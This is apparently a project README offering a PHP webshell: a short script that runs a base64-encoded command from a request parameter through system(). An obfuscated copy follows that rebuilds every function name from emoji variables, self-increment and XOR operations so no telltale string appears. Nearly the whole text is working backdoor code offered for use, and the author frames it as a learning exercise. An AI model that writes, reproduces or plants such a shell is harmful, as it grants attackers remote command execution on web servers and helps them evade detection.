# php-emoji-webshell

🥸 Nothing new about this webshell, just use same techniques like XOR and self increment operations.

Basically this code
```php
<?php

$a = $_REQUEST[4] ? base64_decode($_REQUEST[4]) : 'whoami';
@system($a);

```
Turn into emoji, self increment and XOR operations.

```php
<?php

$_=[];                      // $_ = [];
$_=@"$_";                   // $_ = "Array";
$__=("_"=="_")+("_"=="_");  // $__ = 1 + 1;
$_=@$_[++$__];              // $_ = $_[3] // "Array"[3]

$🌏=$_++; // a
$🤮=$_++; // b
$🍪=$_++; // c
$🫣=$_++; // d
$🧁=$_++; // e
$🎂=$_++; // f
$🥃=$_++; // g
$🍔=$_++; // h
$🌘=$_++; // i
$🌗=$_++; // j
$🌖=$_++; // k
$🌕=$_++; // l
$🌒=$_++; // m
$🌓=$_++; // n
$🌔=$_++; // o
$🌰=$_++; // p
$🍘=$_++; // q
$🥗=$_++; // r
$🥥=$_++; // s
$🍑=$_++; // t
$🍋=$_++; // u
$🧇=$_++; // v
$🌮=$_++; // w
$🍕=$_++; // x
$🥯=$_++; // y
$🍣=$_;   // z

$__++; // 4
$__++; // 5
$__++; // 6
$👿=$🤮.$🌏.$🥥.$🧁.$__; // base6
$__--; // 5
$__--; // 4
$👿.=$__.("#"^"|").$🫣.$🧁.$🍪.$🌔.$🫣.$🧁; // base64_decode

$💀=$🥥.$🥯.$🥥.$🍑.$🧁.$🌒; // system
$🥳=("#"^"|").($🍘^"#").($🎂^"#").($🥗^"#").($🧇^"#").($🎂^"#").($🌰^"#").($🌮^"#"); // _REQUEST
$🤯=@${$🥳}[$__] ? $👿(@${$🥳}[$__]) : $🌮.$🍔.$🌔.$🌏.$🌒.$🌘; // $_REQUEST[4] ? base64_decode($_REQUEST[4]) : "whoami"
@$💀($🤯); // @system("command")

```

Im just building this for fun and for the sake of learning new things. ☕️🥯
